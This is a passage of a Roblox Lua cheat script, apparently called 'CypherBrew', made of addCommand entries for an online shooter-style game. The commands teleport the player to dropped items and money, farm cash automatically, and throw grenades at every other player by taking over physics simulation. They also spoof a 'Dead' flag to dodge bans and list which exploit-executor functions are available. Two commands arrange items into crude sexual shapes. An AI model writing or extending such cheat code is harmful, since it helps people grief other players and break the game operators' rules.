			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
		end;
	});

	addCommand({
		["Name"] = "gettools";
		["Function"] = function()
			local d = game.Players.LocalPlayer.Character.HumanoidRootPart.Position;
			for h, i in pairs(game.Workspace.Ignored.ItemsDrop:GetChildren()) do
				if i.Name == "Part" then
					if i:FindFirstChild("[LockPicker]") or i:FindFirstChild("[Knife]") then
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = i.CFrame;
						if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - i.Position).Magnitude <= 50 then
							wait()
						end
					end
				end
			end;
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
		end;
	});

	addCommand({
		["Name"] = "tools";
		["Function"] = function()
			local d = game.Players.LocalPlayer.Character.HumanoidRootPart.Position;
			for h, i in pairs(game.Workspace.Ignored.ItemsDrop:GetChildren()) do
				if i.Name == "Part" then
					if i:FindFirstChild("[LockPicker]") or i:FindFirstChild("[Knife]") then
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = i.CFrame;
						if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - i.Position).Magnitude <= 50 then
							wait()
						end
					end
				end
			end;
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
		end;
	});

	addCommand({
		["Name"] = "splitgrenade";
		["Function"] = function()

			local LocalPlayer = game:GetService("Players").LocalPlayer
			local char = LocalPlayer.Character
			local Ignored = game.workspace.Ignored
			local backpack = LocalPlayer.Backpack
			local x = 0
			local Grenade = "[Grenade]"
			local DroppedGrenade = "Handle"
			for i, v in pairs(backpack:GetChildren()) do
				if v.Name == Grenade then
					v.Parent = char
				end
			end
			for i, v in pairs(char:GetChildren()) do
				if v.Name == Grenade then
					v:Activate()
					v:Activate()
				end
			end
			wait (1)
			for i, v in pairs(Ignored:GetChildren()) do
				if v.Name == DroppedGrenade then
					x = x + 1
					v.Name = DroppedGrenade..x
				end
			end
			wait(1)
			x = 0
			for i, player in pairs(game.Players:GetPlayers()) do
				x = x + 1
				local launch = Ignored:WaitForChild(DroppedGrenade..x)
				if LocalPlayer.Name == player.Name then
					do
						launch.Position = Vector3.new(0, 1000, 0)
					end
				else
					do
						game.Players.LocalPlayer.MaximumSimulationRadius = math.pow(math.huge, math.huge) * math.huge
						game.Players.LocalPlayer.SimulationRadius = math.pow(math.huge, math.huge) * math.huge
						launch.Position = player.Character.HumanoidRootPart.Position
						wait (0.02)
					end

				end
			end
		end;
	});


	addCommand({
		["Name"] = "batdupe";
		["Function"] = function()
			game.Players.LocalPlayer.Backpack["[Bat]"].GripPos = Vector3.new(0, -2, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripForward = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripRight = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripUp = Vector3.new(0, 100, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].Parent = game.Players.LocalPlayer.Character

			game.Players.LocalPlayer.Backpack["[Bat]"].GripPos = Vector3.new(0, -4, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripForward = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripRight = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripUp = Vector3.new(0, 100, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].Parent = game.Players.LocalPlayer.Character


			game.Players.LocalPlayer.Backpack["[Bat]"].GripPos = Vector3.new(0, -6, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripForward = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripRight = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripUp = Vector3.new(0, 100, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].Parent = game.Players.LocalPlayer.Character

			game.Players.LocalPlayer.Backpack["[Bat]"].GripPos = Vector3.new(0, -8, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripForward = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripRight = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripUp = Vector3.new(0, 100, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].Parent = game.Players.LocalPlayer.Character

			game.Players.LocalPlayer.Backpack["[Bat]"].GripPos = Vector3.new(0, -10, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripForward = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripRight = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripUp = Vector3.new(0, 100, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].Parent = game.Players.LocalPlayer.Character

			game.Players.LocalPlayer.Backpack["[Bat]"].GripPos = Vector3.new(0, -12, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripForward = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripRight = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripUp = Vector3.new(0, 100, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].Parent = game.Players.LocalPlayer.Character

			game.Players.LocalPlayer.Backpack["[Bat]"].GripPos = Vector3.new(0, -14, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripForward = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripRight = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripUp = Vector3.new(0, 100, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].Parent = game.Players.LocalPlayer.Character

			game.Players.LocalPlayer.Backpack["[Bat]"].GripPos = Vector3.new(0, -16, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripForward = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripRight = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripUp = Vector3.new(0, 100, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].Parent = game.Players.LocalPlayer.Character

			game.Players.LocalPlayer.Backpack["[Bat]"].GripPos = Vector3.new(0, -18, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripForward = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripRight = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripUp = Vector3.new(0, 100, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].Parent = game.Players.LocalPlayer.Character

			game.Players.LocalPlayer.Backpack["[Bat]"].GripPos = Vector3.new(0, -22, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripForward = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripRight = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripUp = Vector3.new(0, 100, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].Parent = game.Players.LocalPlayer.Character

			game.Players.LocalPlayer.Backpack["[Bat]"].GripPos = Vector3.new(0, -25, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripForward = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripRight = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripUp = Vector3.new(0, 100, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].Parent = game.Players.LocalPlayer.Character

			game.Players.LocalPlayer.Backpack["[Bat]"].GripPos = Vector3.new(0, -28, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripForward = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripRight = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripUp = Vector3.new(0, 100, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].Parent = game.Players.LocalPlayer.Character

			game.Players.LocalPlayer.Backpack["[Bat]"].GripPos = Vector3.new(0, -30, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripForward = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripRight = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripUp = Vector3.new(0, 100, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].Parent = game.Players.LocalPlayer.Character

			game.Players.LocalPlayer.Backpack["[Bat]"].GripPos = Vector3.new(0, -32, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripForward = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripRight = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripUp = Vector3.new(0, 100, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].Parent = game.Players.LocalPlayer.Character

			game.Players.LocalPlayer.Backpack["[Bat]"].GripPos = Vector3.new(0, -35, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripForward = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripRight = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripUp = Vector3.new(0, 100, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].Parent = game.Players.LocalPlayer.Character

			game.Players.LocalPlayer.Backpack["[Bat]"].GripPos = Vector3.new(0, -38, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripForward = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripRight = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripUp = Vector3.new(0, 100, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].Parent = game.Players.LocalPlayer.Character

			game.Players.LocalPlayer.Backpack["[Bat]"].GripPos = Vector3.new(0, -42, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripForward = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripRight = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripUp = Vector3.new(0, 100, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].Parent = game.Players.LocalPlayer.Character

			game.Players.LocalPlayer.Backpack["[Bat]"].GripPos = Vector3.new(0, -45, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripForward = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripRight = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripUp = Vector3.new(0, 100, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].Parent = game.Players.LocalPlayer.Character
		end;
	});

	addCommand({
		["Name"] = "katana";
		["Function"] = function()
			game.Players.LocalPlayer.Backpack["[Knife]"].GripPos = Vector3.new(1, 0, 0.1)
			game.Players.LocalPlayer.Backpack["[Knife]"].GripForward = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Knife]"].GripRight = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Knife]"].GripUp = Vector3.new(-1, 0, 0)
			game.Players.LocalPlayer.Backpack["[Knife]"].Parent = game.Players.LocalPlayer.Character

			game.Players.LocalPlayer.Backpack["[Knife]"].GripPos = Vector3.new(2, 0, 0.1)
			game.Players.LocalPlayer.Backpack["[Knife]"].GripForward = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Knife]"].GripRight = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Knife]"].GripUp = Vector3.new(-1, 0, 0)
			game.Players.LocalPlayer.Backpack["[Knife]"].Parent = game.Players.LocalPlayer.Character 

			game.Players.LocalPlayer.Backpack["[Knife]"].GripPos = Vector3.new(3, 0, 0.1)
			game.Players.LocalPlayer.Backpack["[Knife]"].GripForward = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Knife]"].GripRight = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Knife]"].GripUp = Vector3.new(-1, 0, 0)
			game.Players.LocalPlayer.Backpack["[Knife]"].Parent = game.Players.LocalPlayer.Character 

			game.Players.LocalPlayer.Backpack["[Knife]"].GripPos = Vector3.new(4, 0, 0.1)
			game.Players.LocalPlayer.Backpack["[Knife]"].GripForward = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Knife]"].GripRight = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Knife]"].GripUp = Vector3.new(-1, 0, 0)
			game.Players.LocalPlayer.Backpack["[Knife]"].Parent = game.Players.LocalPlayer.Character 
		end;
	});

	addCommand({
		["Name"] = "nuke";
		["Function"] = function()
			pcall(function()
				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '[Grenade]' then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end)
			wait(.9)
			local targetpos = CFrame.new(108.995865, -26.7500305, -276.529877)
			local plr = game.Players.LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game.Players.LocalPlayer.Character:FindFirstChild("[Grenade]") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["[Grenade] - $700"]:FindFirstChild("ClickDetector")
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
				game.Players.LocalPlayer.Backpack:FindFirstChild("[Grenade]").Parent = plr.Character
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
				game.Players.LocalPlayer.Backpack:FindFirstChild("[Grenade]").Parent = plr.Character
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
				game.Players.LocalPlayer.Backpack:FindFirstChild("[Grenade]").Parent = plr.Character
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
				game.Players.LocalPlayer.Backpack:FindFirstChild("[Grenade]").Parent = plr.Character
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
				game.Players.LocalPlayer.Backpack:FindFirstChild("[Grenade]").Parent = plr.Character
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
				game.Players.LocalPlayer.Backpack:FindFirstChild("[Grenade]").Parent = plr.Character
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
				game.Players.LocalPlayer.Backpack:FindFirstChild("[Grenade]").Parent = plr.Character
				wait(.9)
				fireclickdetector(cd)
				wait(.4)
				game.Players.LocalPlayer.Backpack:FindFirstChild("[Grenade]").Parent = plr.Character
				wait(.9)
				local oh1 = CFrame.new(-411.605194, 21.7499943, -332.942078)
				local oh2 = game:GetService("Players")
				local oh3 = oh2.LocalPlayer.Character.HumanoidRootPart


				oh3.CFrame = oh1

				-- end of script
				local oh1 = CFrame.new(-396.677094, 51.750145, -336.327148)
				local oh2 = game:GetService("Players")
				local oh3 = oh2.LocalPlayer.Character.HumanoidRootPart


				oh3.CFrame = oh1

				-- end of script
				local oh1 = CFrame.new(-408.277466, 77.8071213, -369.336456)
				local oh2 = game:GetService("Players")
				local oh3 = oh2.LocalPlayer.Character.HumanoidRootPart


				oh3.CFrame = oh1

				-- end of script
				local oh1 = CFrame.new(-396.90979, 61.7791367, -381.694397)
				local oh2 = game:GetService("Players")
				local oh3 = oh2.LocalPlayer.Character.HumanoidRootPart


				oh3.CFrame = oh1

				-- end of script
			end
			local LocalPlayer = game:GetService("Players").LocalPlayer
			local char = LocalPlayer.Character
			local Ignored = game.workspace.Ignored
			local backpack = LocalPlayer.Backpack
			local x = 0
			local Grenade = "[Grenade]"
			local DroppedGrenade = "Handle"
			for i, v in pairs(backpack:GetChildren()) do
				if v.Name == Grenade then
					v.Parent = char
				end
			end
			for i, v in pairs(char:GetChildren()) do
				if v.Name == Grenade then
					v:Activate()
					v:Activate()
				end
			end
			wait (1)
			for i, v in pairs(Ignored:GetChildren()) do
				if v.Name == DroppedGrenade then
					x = x + 1
					v.Name = DroppedGrenade..x
				end
			end
			wait(1)
			x = 0
			for i, player in pairs(game.Players:GetPlayers()) do
				x = x + 1
				local launch = Ignored:WaitForChild(DroppedGrenade..x)
				if LocalPlayer.Name == player.Name then
					do
						launch.Position = Vector3.new(0, 1000, 0)
					end
				else
					do
						game.Players.LocalPlayer.MaximumSimulationRadius = math.pow(math.huge, math.huge) * math.huge
						game.Players.LocalPlayer.SimulationRadius = math.pow(math.huge, math.huge) * math.huge
						launch.Position = player.Character.HumanoidRootPart.Position
						wait (0.02)
					end

				end
			end
		end;
	});

	addCommand({
		["Name"] = "fistwave";
		["Function"] = function()

			local Part = Instance.new("Part",workspace)
			Part.Name = "Part"
			Part.Anchored = false
			Part.CanCollide = false
			Part.Transparency = 1
			local Part1= Instance.new("Part",workspace)
			Part1.Name = "Part1"
			Part1.Anchored = true
			Part1.CanCollide = false
			Part1.Transparency = 1

			local Weld = Instance.new("Weld", Part1)
			Weld.Part0 = Part1
			Weld.Part1 = Part
			Weld.C0 = CFrame.new(0, 0, 10000)
			pcall(function()
				if game:GetService("Players").LocalPlayer.Character.RightHand:FindFirstChildOfClass("Model") then
					game:GetService("Players").LocalPlayer.Character.RightHand.Model.RightWrist:Destroy()
				end
				game:GetService("Players").LocalPlayer.Character.RightHand.RightWrist:Destroy()
			end)
			local laugh = 0
			while true do
				wait()
				laugh = laugh+200
				Part1.CFrame = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.Angles(0, laugh, math.pi/-2)
				local lol = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
				game:GetService("Players").LocalPlayer.Character.RightHand.CFrame = CFrame.new(Part.CFrame.X ,Part.CFrame.Y+2, Part.CFrame.Z)
				game:GetService("Players").LocalPlayer.Character.RightHand.Massless = true
				game:GetService("Players").LocalPlayer.Character.RightHand.Size = Vector3.new(0, 0, 0)

			end

			local lol = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
			game:GetService("Players").LocalPlayer.Character.RightHand.Size = Vector3.new(1, 0.5, 1)
			for i = 1, 10 do
				game:GetService("Players").LocalPlayer.Character.RightHand.CFrame = lol.CFrame
				wait(0.05)
			end
		end;
	});


	-- Female [Creates Brests]
	addCommand({
		["Name"] = "female";
		["Function"] = function()
			game.Players.LocalPlayer.Backpack["[Hamburger]"].GripPos = Vector3.new(1.5, 1.5, 0.3)
			game.Players.LocalPlayer.Backpack["[Hamburger]"].GripForward = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Hamburger]"].GripRight = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Hamburger]"].GripUp = Vector3.new(0, 0, 90)
			game.Players.LocalPlayer.Backpack["[Hamburger]"].Parent = game.Players.LocalPlayer.Character
			game.Players.LocalPlayer.Backpack["[Hamburger]"].GripPos = Vector3.new(0, 1.5, 0.3)
			game.Players.LocalPlayer.Backpack["[Hamburger]"].GripForward = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Hamburger]"].GripRight = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Hamburger]"].GripUp = Vector3.new(0, 0, 90)
			game.Players.LocalPlayer.Backpack["[Hamburger]"].Parent = game.Players.LocalPlayer.Character
			game.Players.LocalPlayer.Backpack["[Taco]"].GripPos = Vector3.new(0.8, 1.4, 2)
			game.Players.LocalPlayer.Backpack["[Taco]"].GripForward = Vector3.new(4, 0, 0)
			game.Players.LocalPlayer.Backpack["[Taco]"].GripRight = Vector3.new(3, 0, 3)
			game.Players.LocalPlayer.Backpack["[Taco]"].GripUp = Vector3.new(1, 0, 90)
			game.Players.LocalPlayer.Backpack["[Taco]"].Parent = game.Players.LocalPlayer.Character
		end;
	});

	-- Male [Creates a PP]
	addCommand({
		["Name"] = "male";
		["Function"] = function()
			game.Players.LocalPlayer.Backpack["[Hamburger]"].GripPos = Vector3.new(1.5, -0.5, -1)
			game.Players.LocalPlayer.Backpack["[Hamburger]"].GripForward = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Hamburger]"].GripRight = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Hamburger]"].GripUp = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Hamburger]"].Parent = game.Players.LocalPlayer.Character

			game.Players.LocalPlayer.Backpack["[Hamburger]"].GripPos = Vector3.new(1.5, -1.5, -1)
			game.Players.LocalPlayer.Backpack["[Hamburger]"].GripForward = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Hamburger]"].GripRight = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Hamburger]"].GripUp = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Hamburger]"].Parent = game.Players.LocalPlayer.Character

			game.Players.LocalPlayer.Backpack["[Bat]"].GripPos = Vector3.new(2, -1, 0.6)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripForward = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripRight = Vector3.new(0, 0, 0)
			game.Players.LocalPlayer.Backpack["[Bat]"].GripUp = Vector3.new(2, 0, 2)
			game.Players.LocalPlayer.Backpack["[Bat]"].Parent = game.Players.LocalPlayer.Character
		end;
	});

	-- // target
	addCommand({
		["Name"] = "target";
		["Function"] = function(str)
			local target;
			if (str) then
				target = findPlayer(str);
			end;
			if (loopVariables.Targetting == false) then
				loopVariables.Targetting = true
				for _, v in next, game:GetService("Players").LocalPlayer.Character:FindFirstChild("RightHand"):GetChildren() do
					if (v.Name == "RightWrist") then
						v:Destroy();
					end;
				end;
				for _, v in next, game:GetService("Players").LocalPlayer.Character:FindFirstChild("LeftHand"):GetChildren() do
					if (v.Name == "LeftWrist") then
						v:Destroy();
					end;
				end;
				sendNotif("CypherBrew", "Now Targetting "..target.Name..".", 15);
				local connection;
				connection = game:GetService("RunService").RenderStepped:Connect(function()
					if (loopVariables.Targetting == true) then
						game:GetService("Players").LocalPlayer.Character:FindFirstChild("RightHand").CFrame = game:GetService("Players")[target.Name].Character:FindFirstChild("LowerTorso").CFrame;
						game:GetService("Players").LocalPlayer.Character:FindFirstChild("LeftHand").CFrame = game:GetService("Players")[target.Name].Character:FindFirstChild("LowerTorso").CFrame;
					else
						loopVariables.Targetting = false;
						sendNotif("CypherBrew", "Stopped Targetting "..target.Name..".", 15);
						local rightwrist = Instance.new("Motor6D");
						rightwrist.Name = "RightWrist";
						rightwrist.Parent = game:GetService("Players").LocalPlayer.Character.RightHand;
						rightwrist.C0 = CFrame.new(1.18422506e-07, -0.5009287, -6.81715525e-18, 1, 0, 0, 0, 1, 0, 0, 0, 1);
						rightwrist.C1 = CFrame.new(3.55267503e-07, 0.125045404, 5.92112528e-08, 1, 0, 0, 0, 1, 0, 0, 0, 1);
						rightwrist.Part0 = game:GetService("Players").LocalPlayer.Character.RightLowerArm;
						rightwrist.Part1 = game:GetService("Players").LocalPlayer.Character.RightHand;

						local leftwrist = Instance.new("Motor6D");
						leftwrist.Name = "LeftWrist";
						leftwrist.Parent = game:GetService("Players").LocalPlayer.Character.LeftHand;
						leftwrist.C0 = CFrame.new(0.000475466368, -0.5009287, 7.59417072e-20, 1, 0, 0, 0, 1, 0, 0, 0, 1);
						leftwrist.C1 = CFrame.new(0.000475821638, 0.125045404, 5.92112528e-08, 1, 0, 0, 0, 1, 0, 0, 0, 1);
						leftwrist.Part0 = game:GetService("Players").LocalPlayer.Character.LeftLowerArm;
						leftwrist.Part1 = game:GetService("Players").LocalPlayer.Character.LeftHand;
						connection:Disconnect()
					end;
				end);
			else
				loopVariables.Targetting = false;
				sendNotif("CypherBrew", "Stopped Targetting "..target.Name..".", 15);
			end;
		end;
	});

	-- // unban
	addCommand({
		["Name"] = "unban";
		["Function"] = function()
			local localPlayer = game:GetService('Players').LocalPlayer;
			local localCharacter = localPlayer.Character;
			localCharacter:FindFirstChildOfClass('Humanoid').Health = 0;
			localCharacter:ClearAllChildren()
			local newCharacter = localPlayer.CharacterAdded:Wait();
			local spoofFolder = Instance.new('Folder');
			spoofFolder.Name = 'FULLY_LOADED_CHAR';
			spoofFolder.Parent = newCharacter;
			newCharacter:WaitForChild('BodyEffects').Dead:Destroy();
			local spoofValue = Instance.new('BoolValue', newCharacter.BodyEffects);
			spoofValue.Name = 'Dead';
		end;
	})

	-- // exploit info
	addCommand({
		["Name"] = "exploitinfo";
		["Function"] = function()
			sendNotif("[CypherBrew]", "Check Exploit Functions on console / printed functions", 15);
			local Globals = {
				getconnections,
				getgc,
				getinstances,
				getnilinstances,
				getscripts,
				getloadedmodules,
				fireclickdetector,
				firetouchinterest,
				isnetworkowner,
				gethiddenproperty,
				sethiddenproperty,
				setsimulationradius,
				getsenv,
				getcallingscript,
				getrawmetatable,
				setrawmetatable,
				setreadonly,
				isreadonly,
				hookfunction,
				newcclosure,
				checkcaller,
				decompile,
				setfflag,
				getnamecallmethod,
				setnamecallmethod,
				getspecialinfo,
				saveinstance,
				drawing,
				debug,
				debug.getconstants,
				debug.getconstant,
				debug.setconstant,
				debug.getupvalues,
				debug.getupvalue,
				debug.setupvalue,
				debug.getprotos,
				debug.getproto,
				debug.setproto,
				debug.getstack,
				debug.setstack,
				debug.setmetatable,
				debug.getregistry,
				debug.getinfo
			}

			local GlobalsNames = {
				"getconnections",
				"getgc",
				"getinstances",
				"getnilinstances",
				"getscripts",
				"getloadedmodules",
				"fireclickdetector",
				"firetouchinterest",
				"isnetworkowner",
				"gethiddenproperty",
				"sethiddenproperty",
				"setsimulationradius",
				"getsenv",
				"getcallingscript",
				"getrawmetatable",
				"setrawmetatable",
				"setreadonly",
				"isreadonly",
				"hookfunction",
				"newcclosure",
				"checkcaller",
				"decompile",
				"setfflag",
				"getnamecallmethod",
				"setnamecallmethod",
				"getspecialinfo",
				"saveinstance",
				"drawingtable",
				"debugtable",
				"debug.getconstants",
				"debug.getconstant",
				"debug.setconstant",
				"debug.getupvalues",
				"debug.getupvalue",
				"debug.setupvalue",
				"debug.getprotos",
				"debug.getproto",
				"debug.setproto",
				"debug.getstack",
				"debug.setstack",
				"debug.setmetatable",
				"debug.getregistry",
				"debug.getinfo"
			}

			for i, v in pairs(GlobalsNames) do
				if Globals[i] then
					print(v.." | Supported")
				else
					print(v.." | Not Supported")
				end
			end
			-- Checks what functions your executor has pretty much u can check what it has
		end;
	})



	-- // equipallitems
	addCommand({
		["Name"] = "equipall";
		["Function"] = function()
			for _, v in next, game:GetService("Players").LocalPlayer.Backpack:GetChildren() do
				if v:IsA("Tool") then
					v.Parent = game:GetService("Players").LocalPlayer.Character
				end;
			end;
		end;
	})

	addCommand({
		["Name"] = "automoney";
		["Function"] = function()
			local d = game.Players.LocalPlayer.Character.HumanoidRootPart.Position;
			for e, f in pairs(game.Workspace.Ignored.Drop:GetChildren()) do
				if f.Name == "MoneyDrop" then
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = f.Parent:FindFirstChild("MoneyDrop").CFrame;
					if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - f.Position).Magnitude <= 50 then
						wait(.8)
						fireclickdetector(f:FindFirstChild("ClickDetector"), 4)
						wait(2)
					end
				end
			end;
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
		end;
	})

	addCommand({
		["Name"] = "grabmoney";
		["Function"] = function()
			local d = game.Players.LocalPlayer.Character.HumanoidRootPart.Position;
			for e, f in pairs(game.Workspace.Ignored.Drop:GetChildren()) do
				if f.Name == "MoneyDrop" then
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = f.Parent:FindFirstChild("MoneyDrop").CFrame;
					if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - f.Position).Magnitude <= 50 then
						wait(.8)
						fireclickdetector(f:FindFirstChild("ClickDetector"), 4)
						wait(2)
					end
				end
			end;
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
		end;
	})

	addCommand({
		["Name"] = "gotomoney";
		["Function"] = function()
			local Players = game.Players
			local Player = Players.LocalPlayer

			local toMe = game.Workspace.Ignored.Drop.MoneyDrop

			function telePlr()
				Player.Character.HumanoidRootPart.CFrame = CFrame.new(toMe.Position)
			end
			telePlr()
		end;
	})

	addCommand({
		["Name"] = "autograbmoneyinmagnitude";
		["Function"] = function()
			if (loopVariables.AutoGrabMoneyInMagnitude == false) then
				loopVariables.AutoGrabMoneyInMagnitude = true;
				sendNotif("", "AutoGrabMoneyInMagnitude Enabled.");
			else
				loopVariables.AutoGrabMoneyInMagnitude = false;
				sendNotif("", "AutoGrabMoneyInMagnitude Disabled.");
			end;
			while true do
				wait()
				for i, v in pairs(workspace.Ignored.Drop:GetChildren()) do
					if v.Name == "MoneyDrop" and (workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.Position - v.Position).Magnitude < 25 and loopVariables.AutoGrabMoneyInMagnitude == true then
						fireclickdetector(v.ClickDetector)
					end
				end
			end
		end;
	})

	-- Mask Spam
	addCommand({
		["Name"] = "blockspam";
		["Function"] = function()
			gsPlayers = game:GetService("Players")
			gsWorkspace = game:GetService("Workspace")
			gsLighting = game:GetService("Lighting")
			gsReplicatedStorage = game:GetService("ReplicatedStorage")
			gsCoreGui = game:GetService("CoreGui")
			gsTween = game:GetService("TweenService")
			gsHttp = game:GetService("HttpService")

			LP = gsPlayers.LocalPlayer
			Mouse = LP:GetMouse()

			LP.Character.ChildAdded:Connect(function(b)
				wait(0)
				if b:IsA("Accessory") then
					b.Handle.Mesh:Destroy()
